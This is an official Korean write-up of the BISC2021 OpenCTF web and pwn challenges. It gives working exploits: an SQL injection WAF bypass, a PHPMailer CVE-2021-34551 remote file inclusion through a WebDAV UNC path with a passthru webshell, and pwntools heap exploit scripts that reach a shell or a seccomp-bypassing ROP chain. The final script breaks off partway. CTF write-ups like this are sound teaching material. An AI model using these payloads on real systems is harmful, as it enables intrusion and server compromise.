---
layout: post
title: "BISC2021 OpenCTF Official Write-up"
author: "choiys, epist, bugday"
comments: true
tags: [web, pwn, reversing]
---

# [WEB] Select, EaSSI

라온화이트햇 핵심연구팀 최용선(choiys)

# 0. 개요

---

2021. 11. 27(토) 14시~18시까지 진행한 BISC Open CTF에 웹 분야로 select, EaSSI라는 이름으로 웹 문제를 출제했습니다.

본 문서는 각 문제에 대한 풀이를 작성한 보고서입니다.

# 1. select

---

select 문제는 취약한 waf 설정으로 인해 발생할 수 있는 간단한 sql injection을 컨셉으로 만든 문제입니다.

`SOLVER : 2`

## 1.1. 문제 구성 및 환경

---

![Untitled](/assets/2022-01-01/BISC.png)

select 문제의 소스코드는 간단합니다.

uid는 guest로 고정되어 있으며, upw와 username이 일치할 경우 uid를 return하는 기능을 제공합니다.

이 때 파라미터의 value에 `select`나 sql에 영향을 미칠만한 `', ", `` 가 포함될 경우 루틴을 종료하는 WAF 기능이 존재합니다.

`sql injection`을 이용하여 return되는 값이 `admin`이 되도록 조작한다면 플래그를 얻을 수 있는 문제입니다.

![Untitled](/assets/2022-01-01/BISC%201.png)

환경 구성은 `PHP 7.4`, `Mysql8.0.22` 로 구성하였으며, 데이터베이스에는 admin 데이터가 존재하지 않습니다.

## 1.2. 문제 풀이

---

![Untitled](/assets/2022-01-01/BISC%202.png)

위와 같이 파라미터를 전달할 경우

SELECT uid FROM tb WHERE uid='guest' AND upw='**\' AND username=**'or 1=1**#'**

upw를 닫는 quotation이 `\`로 인해 무시 되어, `username` 파라미터를 여는 quotation까지 upw로 인식하게 되기 때문에 `username` 파라미터에서 실질적으로 원하는 sql 구문을 실행할 수 있습니다.

![Untitled](/assets/2022-01-01/BISC%203.png)

다양한 방법을 통해 db의 테이블 내에는 `admin` 이 포함된 row가 존재하지 않는다는 것을 확인할 수 있습니다.

그렇다면  `union` 을 이용하여 새로운 row를 만들어 `admin` 이라는 값이 나오도록 쿼리를 수정해야 하는데, `union` 구문을 사용하기 위한 `select` 가 WAF에 의해 필터링 되기 때문에 접근하기가 쉽지 않습니다.

![Untitled](/assets/2022-01-01/BISC%204.png)

[https://dev.mysql.com/doc/refman/8.0/en/union.html](https://dev.mysql.com/doc/refman/8.0/en/union.html)

`mysql document`의 `union` 섹션을 살펴보면 `mysql 8.0.19` 부터  `union` 내부에서  `values` 를 사용하면서 `select` 와 동등한 효과를 기대할 수 있다는 언급이 존재합니다.

![Untitled](/assets/2022-01-01/BISC%205.png)

이를 통해 `union values row()` 를 이용하여 `union` 구문을 사용할 수 있다는 것을 확인하였습니다.

 `'` 가 필터링 되었기 때문에 `0x` 를 이용하여 hex encoded string으로 `admin` 을 밀어넣어주면 플래그를 획득할 수 있습니다.

`FLAG : BISC{what_is_values_and_row_in_mysql}`

# 2. EaSSI

---

EaSSI 문제는 지난 BoB 10th CTF에서 출제된 2번째 문제인데, 당시 0 solver 문제였기 때문에 재출제 하게 되었습니다. 이 문제는 windows php 환경에서 취약한 버전의 PHPMailer 라이브러리를 사용할 때 발생하는 취약점을 컨셉으로 만든 문제입니다.

`SOLVER: 1`

## 2.1. 문제 구성 및 환경

---

![Untitled](/assets/2022-01-01/BISC%206.png)

문제의 메인페이지입니다. `HOME, SECRET, GALLERY, CONTACT` 총 4개의 메뉴가 존재하는 것을 확인할 수 있습니다.

환경 구성은 `PHP7.4.26` , `Apache2.4.51` 로 구성하였습니다.

## 2.2. 문제 풀이

---

각 메뉴 클릭 시 `http://ctf.choiys.kr:1123/?page=gallery` 와 같이 page 파라미터를 이용하여 페이지를 불러오는 것을 알 수 있습니다.

```php
if(isset($_GET["page"])) {
    $page = "./template/" . $_GET["page"] . ".php";
    if(!is_file($page))
        $page = "./template/home.php";
}
else
    $page = "./template/home.php";

include_once $page;
```

index.php에서 page 파라미터를 처리하는 루틴입니다. 파일 존재 여부를 확인하기 때문에 LFI 등의 취약점은 존재하지 않습니다.

다음으로 gallery 메뉴입니다.

![Untitled](/assets/2022-01-01/BISC%207.png)

`http://ctf.choiys.kr:1123/?page=gallery&num=3&image=static/images/3.jpg` 

![Untitled](/assets/2022-01-01/BISC%208.png)

`http://ctf.choiys.kr:1123/?page=gallery&num=5&image=static/images/5`

gallery에 접근한 후 글 번호를 클릭하면 위와 같은 URL로 요청하는 것을 확인할 수 있습니다. image 파라미터로 경로를 입력 받고, 이에 대한 이미지 또는 내용을 출력해주는 기능인 것으로 생각할 수 있습니다.

![Untitled](/assets/2022-01-01/BISC%209.png)

![Untitled](/assets/2022-01-01/BISC%2010.png)

각각 직접 접근해보면 이미지 파일과 텍스트 파일이 존재하는 것을 확인할 수 있습니다.

텍스트 파일을 불러오는 경우 `file_get_contents` 또는 `fopen` , `include` 등의 함수를 사용할 수 있습니다.

![Untitled](/assets/2022-01-01/BISC%2011.png)

`http://ctf.choiys.kr:1123/?page=gallery&num=4&image=index.php` 

위와 같이 `index.php` 등을 요청해본다면 `file_get_contents` 또는 `include` 등의 함수를 사용하여 파일의 내용을 읽어온다고 가정할 수 있으며, 이를 통해 LFI 취약점 발생 가능성이 생기게 됩니다.

```php
$exts = ["jpg", "png", "jpeg", "gif"];
$path = @$_GET["image"];
$ok = preg_match("/base|\.\.|\\\\|C:|log|bot/i", $path, $matches);
if($matches) {
    echo "\"$matches[0]\" is not allowed";
}

// ...

include $path;
```

gallery.php에서 image 파라미터를 처리하는 부분입니다.

일반적으로 `php filter` 를 사용할 때 `convert.base64-encode` 필터를 사용하는데, base64 뿐만 아니라 `string.rot13` , `convert.iconv`, `quoted-printable-encode` 등을 활용해서도 평문 소스코드를 추출할 수 있습니다.

`BOB 10th CTF` 출제 당시 `baby EaSSI` 문제를 풀이하기 위한 벡터였는데, 이를 활용하여 소스코드를 추출할 수 있도록 그대로 두었습니다.

`baby EaSSI` 문제는 이를 활용하여 `secret.php` 의 내용을 읽어오면 플래그를 얻을 수 있는 문제였습니다.

![Untitled](/assets/2022-01-01/BISC%2012.png)

EaSSI 문제의 취약점은 `contact` 페이지에 존재합니다.

![Untitled](/assets/2022-01-01/BISC%2013.png)

![Untitled](/assets/2022-01-01/BISC%2014.png)

`contact` 페이지는 존재하는 메일 계정을 입력 후 `send` 버튼을 클릭하면 실제로 메일을 발송하는 기능을 제공합니다.

```php
function send() {
  let form = document.getElementById("mail");
  let email = form.email.value;
  let name = form.name.value;
  let subject = form.subject.value;
  let content = form.content.value;
  if (email == "" || name == "" || subject == "" || content == "") {
      toast("Please check the form", "error");
      return;
  }

  toast("Waiting...", "waiting");

  fetch("/api/send.php?" + new URLSearchParams({
      email: email,
      name: name,
      subject: subject,
      content: content
  })).then(response => {
      return response.text();
  }).then(text => {
      try {
          let data = JSON.parse(text);
          if (data.result) {
              toast("Send OK", "success");
          } else {
              toast(data.msg, "error");
          }
      } catch {
          toast(text, "error");
      }
  });
}
```

`send` 버튼을 클릭했을 때 `/api/send.php` 로 요청하는 것을 확인할 수 있습니다.

```php
<?php
    include_once "config.php";

    $email = @$_GET["email"];
    $name = @$_GET["name"];
    $subject = @$_GET["subject"];
    $content = @$_GET["content"];

    if(empty($email) || empty($name) || empty($subject) || empty($content)) {
        echo json_encode(array("result"=>false, "msg"=>"check parameter"));
        return;
    }

    $errormsg = "";
    try{
        $mail->setFrom('choiysbot@gmail.com', 'choiys');
        $mail->AddAddress($email, $name);
        $mail->isHTML(true);
        $mail->Subject = '[EaSSI] 문의 메일이 성공적으로 발송되었습니다';
        $mail->Body = "$name 님, 문의 메일이 성공적으로 발송되었습니다.<br>제목 : $subject<br>내용 : $content<br><br><b>실제로 문의에 대한 답장을 드리진 않습니다.</b>";
        $mail->Send();
    } catch (phpmailerException $e) {
        $errormsg = $e->errorMessage();
    } catch (Exception $e) {
        $errormsg = $e->getMessage();
    }

    if($errormsg !== "") {
        echo json_encode(array("result"=>false, "msg"=>"error"));
        return;
    }

    echo json_encode(array("result"=>true));

// /api/send.php
```

`gallery` 에 존재하는 `LFI` 취약점을 이용하여 소스코드를 leak 할 수 있습니다.

`$mail` 객체를 이용하여 메일을 발송하는 것을 확인 할 수 있습니다. `$mail` 객체는 include 하는 `config.php` 에 존재합니다.

```php
<?php
require_once '../vendor/autoload.php';
// PHPMailer 6.4.1

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

$mail = new PHPMailer(true);
// $mail->SMTPDebug = SMTP::DEBUG_SERVER;
$mail->isSMTP();

$errormsg = "";

try {
    $mail->Host = "smtp.gmail.com";
    $mail->SMTPAuth = true;
    $mail->Port = 465;
    $mail->SMTPSecure = "ssl";
    $info = explode("\n", file_get_contents("C:/Users/choiys/Documents/botinfo.txt"));
    $mail->Username = $info[0];
    $mail->Password = $info[1];
    $mail->CharSet = 'utf-8';
    $mail->Encoding = "base64";
} catch (phpmailerException $e) {
    $errormsg = $e->errorMessage();
} catch (Exception $e) {
    $errormsg = $e->getMessage();
}

if($errormsg !== "") {
    echo json_encode(array("result"=>false, "msg"=>"config error"));
    return;
}

// /api/config.php
```

`config.php` 에서 `PHPMailer` 를 사용하는 것을 확인할 수 있습니다. 

`/vendor/autoload.php` 를 사용하기 때문에 `composer` 를 사용하는 것을 인지하고, `LFI` 취약점을 이용하여 `composer.json` 을 leak 하여 버전을 알아낼 수 있습니다.

이렇게 알아내야 할 경우 풀이에 쓸데 없는 시간이 소요될 수 있어, `PHPMailer` 의 버전은 주석을 통해 `6.4.1` 이라고 명시해두었습니다.

![Untitled](/assets/2022-01-01/BISC%2015.png)

`PHPMailer 6.4.1` 버전에는 `CVE-2021-34551` 이 존재하는 것을 구글링을 통해 알아낼 수 있습니다.

![Untitled](/assets/2022-01-01/BISC%2016.png)

`CVE-2021-34551` 은 `Windows` 환경에서 `PHPMailer 6.5.0 미만` 버전에서 발생합니다. `setLanguage()` 함수에서 `$lang_path` 파라미터가 취약한 벡터이며, `UNC Path` 를 이용하여 `RCE` 가 가능합니다.

```html
<!-- ... -->

<div class="menu-wrapper yellow">
    <div class="menu">
        <a href="/?page=home">H O M E</a>
    </div>
    <div class="menu">
        <a href="/?page=secret">S E C R E T</a>
    </div>
    <div class="menu">
        <a href="/?page=gallery">G A L L E R Y</a>
    </div>
    <div class="menu">
        <a href="/?page=contact">C O N T A C T</a>
    </div>
    <!-- <div class="menu">
        <a href="/phpinfo.php">I N F O</a>
    </div> -->
</div>

<!-- ... -->

<!-- view-source -->
```

`view-source`를 통해 페이지를 살펴보면 메뉴 중 `/phpinfo.php` 가 주석처리 돼 있는 것을 확인할 수 있습니다.

![Untitled](/assets/2022-01-01/BISC%2017.png)

![Untitled](/assets/2022-01-01/BISC%2018.png)

phpinfo에서 해당 시스템이 `Windows` 환경이라는 것을 확인할 수 있습니다. 또한, `allow_url_include` 옵션이 `Off` 로 세팅되어 있어 일반적으로 `RFI` 는 불가능한 환경입니다.

![Untitled](/assets/2022-01-01/BISC%2019.png)

이제 `CVE-2021-34551` 에 취약한 환경인 것을 확인하였으니, 본격적인 exploit을 위해 PHPMailer github에서 커밋로그를 살펴보면 `setLanguage()` 함수에서 위와 같은 패치 내역이 존재하는 것을 확인할 수 있습니다.

기존에 `include $lang_file;`이라는 코드가 존재합니다.

```php
$lang_file = $lang_path . 'phpmailer.lang-' . $langcode . '.php'; 
```

`$lang_file` 은 위와 같이 구성됩니다. `setLanguage()` 함수에서 `$lang_path` 와 `$langcode` 를 파라미터로 전달 받아 전체 경로를 구성하게 됩니다. 그리고 전달 받는 `$lang_path` 에서 별다른 필터링이 없기 때문에 `UNC Path` 를 이용하여 원격 주소지에 있는 파일을 `include` 하여 `RFI` 취약점을 트리거 시킬 수 있습니다.

`UNC` 는 기본적으로 `SMB` 프로토콜을 사용하며, 이를 통해 접근이 실패할 경우 `WebDav` 를 통해 요청을 시도하는 특성을 가지고 있습니다.

`Window Server` 에서 `SMB` 를 통해 원격 주소지에 접근하려고 할 경우 `Windows 자격 증명` 이 필요한 것을 확인하여 트리거가 어려울 것으로 판단하였고, `WebDav` 를 사용할 경우 별다른 인증 없이 접근이 가능하기 때문에 이를 사용하여 exploit이 가능합니다.

![Untitled](/assets/2022-01-01/BISC%2020.png)

`contact` 페이지로 돌아와서, 우측 상단에 `change language` 옵션이 있는 것을 확인할 수 있습니다.

```jsx
function chlang() {
    let sel = document.getElementById("lang");
    let opt = sel.options[sel.selectedIndex].value;

    fetch("/api/language.php?" + new URLSearchParams({
        code: opt,
        path: ""
    })).then(response => {
        return response.text();
    }).then(text => {
        try {
            let data = JSON.parse(text);
            if (data.result) {
                toast("language changed : " + opt, "language");
            } else {
                toast(data.msg, "error");
            }
        } catch {
            toast(text, "error");
        }
    });
}

// contact.php
```

해당 옵션을 사용하면 `api/language.php` 로 요청을 보내는데, 선택한 옵션의 value를 `code` 라는 변수명으로 보내고, `path` 는 공백으로 함께 전송하는 것을 확인할 수 있습니다.

```php
<?php
    include_once "config.php";

    $code = @$_GET["code"];
    $path = @$_GET["path"];

    $errormsg = "";
    try {
        $mail->setLanguage($code, $path);
    } catch(Exception $e) {
        $errormsg = $e->getMessage();
    }

    if($errormsg !== "") {
        echo json_encode(array("result"=>false, "msg"=>"language config error"));
        return;
    }

    echo json_encode(array("result"=>true));

// /api/language.php
```

`language.php` 에서는 전달 받은 `code` 와 `path` 를 이용하여 `setLanguage()` 함수의 인자로 전달하여 실행하는 것을 확인할 수 있습니다.

이제 `setLanguage()` 함수를 이용하여 `RFI` 취약점을 트리거 시킬 수 있게 되었습니다.

`PHPMailer.php`의 `setLanaguae()` 함수에서 `$lang_file` 의 구성을 다시 살펴봅시다.

```php
$lang_file = $lang_path . 'phpmailer.lang-' . $langcode . '.php'; 
```

`$lang_path` 는 `UNC` 를 이용하여 원격 주소지를 표현해주면 되며, `$langcode` 가 `en` 이나 `ko` 등으로 표현되기 때문에 파일명은 `phpmailer.lang-ko.php` 와 같이 지정해주어야합니다.

```php
<?php                                                                                                                                                                                                                                                                         
    // phpmailer.lang-ko.php                                                                                                                                                                                                                                                  
    header("Content-Type: text/html; charset=euc-kr");                                                                                                                                                                                                                        
    echo passthru($_GET["x"]);                                                                                                                                                                                                                                                
?>
```

위와 같은 웹쉘을 `phpmailer.lang-ko.php` 라는 파일명으로 저장 후 `WebDav` 서버를 열어줍니다.

![Untitled](/assets/2022-01-01/BISC%2021.png)

위와 같이 `UNC Path` 를 이용하여 `RFI` 취약점을 트리거 시킬 수 있습니다.

```powershell
http://ctf.choiys.kr:1123/api/language.php?code=ko&path=\\choiys.kr@8880\.\&x=dir%20..

C:\Apache24\htdocs 디렉터리

2021-11-26  오후 05:15    <DIR>          .
2021-11-26  오후 05:15    <DIR>          ..
2021-11-25  오후 10:20                26 .gitignore
2021-11-25  오후 10:20    <DIR>          api
2021-11-25  오후 10:20                69 composer.json
2021-11-26  오후 05:15             3,715 composer.lock
2021-11-25  오후 10:32                33 here_is_the_flag_4f420291c9fdd431c40aa30b2ff334f0.txt
2021-11-25  오후 10:20               459 index.php
2021-11-25  오후 10:20                56 phpinfo.php
2021-11-25  오후 10:20                 8 README.md
2021-11-25  오후 10:20    <DIR>          static
2021-11-25  오후 10:20    <DIR>          template
2021-11-26  오후 05:15    <DIR>          vendor
```

상위 경로로 이동하면 위와 같이 플래그 파일이 존재하는 것을 확인할 수 있습니다.

```powershell
http://ctf.choiys.kr:1123/api/language.php?code=ko&path=\\choiys.kr@8880\.\&x=type%20..\here_is_the_flag_4f420291c9fdd431c40aa30b2ff334f0.txt

BISC{now_you_know_EaSSI_is_34551}{"result":true}
```

`FLAG : BISC{now_you_know_EaSSI_is_34551}`

# 3. 마치며

---

`select` 문제는 이전에 mysql 문서를 뒤지다가 sqlite 뿐만 아니라 mysql에서도 `values`를 쓸 수 있게 되었다는 것이 신기하여 킵 해두고 있었는데, 마침 BISC에서 문제를 출제할 기회가 생겨 만들게 되었습니다.

대회가 시작되고 빠르게 `union values` 를 사용하신 분이 계셨지만, `row` 를 빠뜨려 플래그를 못가져가셔서 상당히 안타까웠습니다..ㅠㅠ

`EaSSI` 문제는 `BOB 10th CTF` 에 출제된 문제였는데 당시 0 solver이기도 하였고, 팀 블로그에 `CVE-2021-34551` 에 관한 내용과 exploit 방법까지 써놓았기에 solver가 많이 나올 것으로 생각했는데 아쉬웠습니다. `CVE-2021-34551` 취약점에 대한 자세한 설명은 [https://core-research-team.github.io/2021-08-01/CVE-2021-34551](https://core-research-team.github.io/2021-08-01/CVE-2021-34551) 을 참조 바랍니다.

대회에 참여해주신 모든 분들, 감사드리며, 고생하셨습니다 :)

# [PWN] note, secure-note

라온화이트햇 핵심연구팀 김재유(epist)

# 0. Intro

---

 2021. 11. 27(토) 14시~18시까지 진행한 BISC Open CTF에 포너블 분야로 note, secure-note라는 이름으로 포너블 문제를 출제하였습니다.

 note 와 secure-note는 단순한 힙 챌린지 형태를 가지며 libc-2.31를 이용하며 둘의 차이는 오로지 seccomp의 여부입니다.

- note: heap alloc, delete, edit
- secure-note: heap alloc, delete, edit (+seccomp)

 Lazy Binding을 사용함으로써 언인텐드 풀이가 발생할 수 있음을 인지는 하였지만 OpenCTF 취지에 맞게 문제 난이도를 더 쉽게 만들고자 바이너리에 Full RELRO를 걸어두지 않은 채로 배포하였습니다. 실제로 여러명이 처음 의도와는 다른 방식으로 풀이한것을 확인하였습니다. 이 문서에서는 다른 풀이를 다루진 않겠습니다.

# 1. note

---

## 1.1 Description

---

```python
I made simple note

nc ctf.epist.kr 30000
```

## 1.2 TL;DR

---

의도된 풀이

1. Tcache poisoning to overwrite `stdout` 
2. Overwrite `_IO_2_1_stdout` to leak
3. Overwrite `__free_hook` to `system`
4. Call system with "/bin/sh"

다른 풀이

1. Tcache poisoning to overwrite `free's GOT`
2. Overwrite `free's GOT` to `puts's PLT` to leak
3. Overwrite `free's GOT` to `system`
4. Call system with "/bin/sh"

## 1.3 Solution

---

### 1.3.1 Look inside binary

 바이너리를 분석하면 다음과 같은 기능을 제공하는 것을 확인할 수 있습니다. 전형적인 힙 챌린지 형태를 가졌지만 출력 기능을 제공하지 않는다는 것을 확인할 수 있습니다.

1. sub_4013479(alloc) 
2. sub_401458(delete)
3. sub_4014F8(edit)

 할당하는 Note 구조체는 sub_4013479(alloc)를 통해서 분석할 수 있으며 bss 영역인 unk_4040A0에 배열로 저장하는 것을 확인할 수 있습니다.

```c
__int64 sub_401347()
{
  ...
  *((_QWORD *)&unk_4040A0 + 2 * idx) = note;
  dword_4040A8[4 * idx] = size;
  ...
}
```

```c
/* expected Note structure */
typedef struct {
	unsigned char* note;
	unsigned int size;
} Note;
```

### 1.3.2 Finding bugs

 바이너리에서 Note 구조체 할당된 note 버퍼를 free하는 sub_401458에 `UAF(Use-After-Free)` 취약점이 존재합니다. sub_401458에서 note 구조체에 할당되는 note 버퍼의 주소를 free 시키고 별도의 초기화를 해주지 않기 때문에 발생합니다.

```c
__int64 sub_401458()
{
  __int64 result; // rax
  unsigned int v1; // [rsp+Ch] [rbp-4h]

  printf("idx: ");
  v1 = sub_401276();
  if ( v1 <= 9 )
  {
    if ( *((_QWORD *)&unk_4040A0 + 2 * v1) )
    {
      free(*((void **)&unk_4040A0 + 2 * v1));  // Use-After-Free!
      puts("done");
      result = 0LL;
    }
    else
    {
      puts("invalid note");
      result = 0xFFFFFFFFLL;
    }
  }
  else
  {
    puts("invalid index");
    result = 0xFFFFFFFFLL;
  }
  return result;
}
```

 note 버퍼를 free시킨 후 sub_4014F8(edit)를 통해 freed chunk의 fd, bk를 조작할 수 있으며 bin 리스트를 조작할 수 있습니다.

### 1.3.3 Leaking address

 앞서 찾아진 UAF를 이용하여 Tcache의 bin 구조를 공격할 수 있습니다. Note의 note 버퍼를 할당하고 해제를 하게 되면 해당 청크는 Tcache bin에 들어가게 됩니다. 이때 edit 기능을 이용해 PIE 걸려있지 않는 바이너리 주소를 덮어씀으로써 .data나 .bss영역에 데이터를 할당할 수 있습니다.

 Tcache Poisoning을 이용하여 .bss 영역에 존재하는 stdout pointer 오프셋으로 덮으면 Tcache bin엔 다음과 같은 형태의 리스트가 만들어집니다.

```c
Tcache Bin

... -> 0x404080(.bss) -> 0x7ffff7fa86a0(stdout) -> 0xfbad2084
```

 bin의 카운터가 충분한 경우, 최종적으로 stdout 오프셋에 메모리를 할당할 수 있으며 `IO_2_1_stdout*→*_IO_write_base`를 덮어 stdout을 이용하여 libc address를 출력할 수 있습니다.

### 1.3.4 Exploit

 Tcache bin을 다시 poisoning 하여 __free_hook을 리스트에 넣은 후 해당 주소에 note를 할당하여 system 함수 주소를 덮어 쓰고, 또다른 note에 "/bin/sh"를 넣은채로 할당하여 free를 호출하게 되면 system("/bin/sh")이 최종적으로 호출됩니다.

 

 아래는 코드는 solution script입니다.

```python
from pwn import *

context.arch = 'amd64'
p = remote('ctf.epist.kr', 30000)

libc = ELF('./libc.so.6')

def create(idx, size, note):
    p.sendlineafter('> ', str(1))
    p.sendlineafter(': ', str(idx))
    p.sendlineafter(': ', str(size))
    p.sendafter(': ', note)

def delete(idx):
    p.sendlineafter('> ', str(2))
    p.sendlineafter(': ', str(idx))

def edit(idx, note):
    p.sendlineafter('> ', str(3))
    p.sendlineafter(': ', str(idx))
    p.sendafter(': ', note)

# stage1: tcache poisoning to free stdout 
create(0, 0x200, b'aaaa')
create(1, 0x200, b'aaaa')
create(2, 0x200, b'aaaa')
delete(2)
delete(1)
delete(0)
edit(0, p64(0x404080))

# stage2: leak libc base from stdout
create(0, 0x200, b'aaaa')
create(1, 0x200, b'\xa0')
create(2, 0x200, p64(0xfbad1800) + b'\x00' * 25)
libc_leak = u64(p.recvuntil(b'done')[0x8:0x10])
libc_base = libc_leak - 2013568
log.info(f'libc base : 0x{libc_base:x}')
system = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']

sleep(0.3)

# stage3: overwrite free_hook to system
create(0, 0x100, b'aaaa')
create(1, 0x100, b'aaaa')
delete(1)
delete(0)
edit(0, p64(free_hook))
create(0, 0x100, b'aaaa')
create(0, 0x100, p64(system))
create(0, 0x10, b'/bin/sh\x00')
delete(0)

p.interactive()
```

# 2. secure-note

---

## 2.1 Description

---

```python
I made secrue note

nc ctf.epist.kr 30002
```

## 2.2 TL;DR

---

의도된 풀이

1. Tcache poisoning to overwrite `stdout` 
2. Overwrite `_IO_2_1_stdout` to leak
3. Write ROP payload(open-read-write) in .bss 
4. Overwrite `__free_hook` to stack-pivot gadget(`setcontext` gadget)
5. Call setcontext and ROP payload(open-read-write)

## 2.3 Solution

---

### 2.3.1 Look inside binary

 바이너리를 분석하면 note와 다른점은 sub_4016E3 함수를 main에서 호출하는 것 뿐입니다. sub_4016E3 함수를 살펴보면 `seccomp`을 이용해 syscall filter를 이용하는 것을 확인할 수 있습니다. 해당 rule에 위배되는 모든 syscall을 사용하려고 시도하는 경우 Bad Syscall과 함께 프로그램은 종료됩니다.

```c
__int64 sub_4016E3()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(0LL);
  seccomp_rule_add(v1, 2147418112LL, 15LL, 0LL);
  seccomp_rule_add(v1, 2147418112LL, 60LL, 0LL);
  seccomp_rule_add(v1, 2147418112LL, 231LL, 0LL);
  seccomp_rule_add(v1, 2147418112LL, 0LL, 0LL);
  seccomp_rule_add(v1, 2147418112LL, 1LL, 0LL);
  seccomp_rule_add(v1, 2147418112LL, 2LL, 0LL);
  seccomp_load(v1);
  return 0LL;
}
```

 seccomp-tools를 이용하여 바이너리에 걸린 seccomp rule을 쉽게 살펴볼 수 있습니다. 

```c
$ seccomp-tools dump ./secure-note
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
 0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011
 0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x0000000f  if (A == rt_sigreturn) goto 0011
 0009: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0011
 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

 허용되는 syscall은 다음과 같습니다. 아래의 목록 외의 syscall을 사용하게 되면 seccomp으로 인해 차단되어 프로세스가 종료됩니다.

1. read
2. write
3. open
4. rt_sigreturn
5. exit
6. exit_group

### 2.3.2 Bypass seccomp

 execve syscall이 차단되었기 때문에 system은 따로 호출할 수 없기 때문에 플래그를 읽을 수 있는 방법은 open-read-write를 이용하여 플래그를 읽는 방법밖에 없다는 것을 알 수 있습니다.

 다음과 같은 의사코드를 이용해 seccomp에 차단되지 않고 플래그를 얻어올 수 있습니다. 

```c
fd = open('/home/secure-note/flag.txt", O_RDONLY);
read(fd, writable_memory, 0x100);
write(fd, writable_memory, 0x100);
```

 위의 의사코드를 payload로 작성하기 위해서는 다음과 같은 가젯들이 필요 합니다. note 문제와 같은 방법으로 leak을 수행했다고 가정하면 가젯들은 libc에서 쉽게 찾을 수 있습니다. ROPGadget이나 ropper 툴을 이용하여 오프셋을 구할 수 있습니다.

1. pop rdi (syscall 1st argument)
2. pop rsi (syscall 2nd argument)
3. pop rdx (syscall 3rd argument)
4. pop rax (syscall number)
5. xchg eax, edi (open result(fd) → read, write 1st argument)
6. syscall

### 2.3.3 Stack pivoting

 유용하게 이용할 수 있는 stack pivot gadget으로 libc에 존재하는 `setcontext` 함수를 이용할 수 있습니다.  `setcontext` 함수에서는 rdx를 기준으로 모든 레지스터를 정리할 수 있습니다. 

```c

...
.text:00000000000580DD                 mov     rsp, [rdx+0A0h]
.text:00000000000580E4                 mov     rbx, [rdx+80h]
.text:00000000000580EB                 mov     rbp, [rdx+78h]
.text:00000000000580EF                 mov     r12, [rdx+48h]
.text:00000000000580F3                 mov     r13, [rdx+50h]
.text:00000000000580F7                 mov     r14, [rdx+58h]
.text:00000000000580FB                 mov     r15, [rdx+60h]
.text:00000000000580FF                 test    dword ptr fs:48h, 2
.text:000000000005810B                 jz      loc_581C6
...
.text:00000000000581C6 loc_581C6:                              ; CODE XREF: setcontext+6B↑j
.text:00000000000581C6                 mov     rcx, [rdx+0A8h]
.text:00000000000581CD                 push    rcx
.text:00000000000581CE                 mov     rsi, [rdx+70h]
.text:00000000000581D2                 mov     rdi, [rdx+68h]
.text:00000000000581D6                 mov     rcx, [rdx+98h]
.text:00000000000581DD                 mov     r8, [rdx+28h]
.text:00000000000581E1                 mov     r9, [rdx+30h]
.text:00000000000581E5                 mov     rdx, [rdx+88h]
.text:00000000000581E5 ; } // starts at 580A0
.text:00000000000581EC ; __unwind {
.text:00000000000581EC                 xor     eax, eax
.text:00000000000581EE                 retn
```

  

 `__free_hook`을 덮어 호출하려고 할때 rdi는 해제하려는 buf의 주소를 가르킵니다.  이때 다음과 같은 call 가젯을 이용해 rdi를 rdx에 저장하고 `setcontext` 주소로 뛰게 만들 수 있습니다.

```c
mov     rdx, [rdi+8]
mov     [rsp], rax
call    qword ptr [rdx+0x20]
```

 

 청크를 다음과 같이 생성하여 위의 가젯으로 `__free_hook`을 호출하게 되면 `setcontext`를 다음과 같은 오프셋으로 정리할 수 있습니다. 마지막으로 rsp를 ROP payload를 가르키게 하면 됩니다.

```c
chunk:
0x00: pad
0x08: &chunk
0x10: pad
0x18: pad
0x20: setcontext (0x580DD)
0x28: r8
0x30: r9
0x38: pad
0x40: pad
0x48: r12
0x50: r13
0x58: r14
0x60: r15
0x68: rdi
0x70: rsi
0x78: rbp
0x80: rbx
0x88: rdx
0x90: pad
0x98: rcx
0xa0: rsp
...
```

### 2.3.4 Exploit

 note와 동일하게 libc address를 leak한 시점에서 Tcache poisoning을 이용하여 .bss 영역에 `setcontext + ROP payload(read-write-read)`를 포함한 청크를 할당시키고, `__free_hook`을 위에서 소개한 call gadget을 호출 시켜 setcontext와 ROP payload가 실행되도록 만들면 플래그를 출력할 수 있습니다.

 아래는 코드는 solution script입니다.

```python
from pwn import *

context.arch = 'amd64'
p = remote('ctf.epist.kr', 30002)

libc = ELF('./libc.so.6')

def create(idx, size, note):
    p.sendlineafter('> ', str(1))
    p.sendlineafter(': ', str(idx))
    p.sendlineafter(': ', str(size))
    p.sendafter(': ', note)

def delete(idx):
    p.sendlineafter('> ', str(2))
    p.sendlineafter(': ', str(idx))

def edit(idx, note):
    p.sendlineafter('> ', str(3))
    p.sendlineafter(': ', str(idx))
    p.sendafter(': ', note)

# stage1: tcache poisoning to free stdout 
create(0, 0x200, b'aaaa')
create(1, 0x200, b'aaaa')
create(2, 0x200, b'aaaa')
delete(2)
delete(1)
delete(0)
edit(0, p64(0x4040a0))

# stage2: leak libc base from stdout
create(0, 0x200, b'aaaa')
create(1, 0x200, b'\xa0')
create(2, 0x200, p64(0xfbad1800) + b'\x00' * 25)
libc_leak = u64(p.recvuntil(b'done')[0x8:0x10])
libc_base = libc_leak - 2013568
log.info(f'libc base : 0x{libc_base:x}')
free_hook = libc_base + libc.sym['__free_hook']

setcontext = libc_base + 0x580dd
call_rdx = libc_base + 0x154930
pop_rax = libc_base + 0x4a550
pop_rdx_r12 = libc_base + 0x11c371
pop_rdi = libc_base + 0x26b72
pop_rsi = libc_base + 0x27529
xchg_eax_edi = libc_base + 0x2ad2b
syscall = libc_base + 0x66229

sleep(0.3)

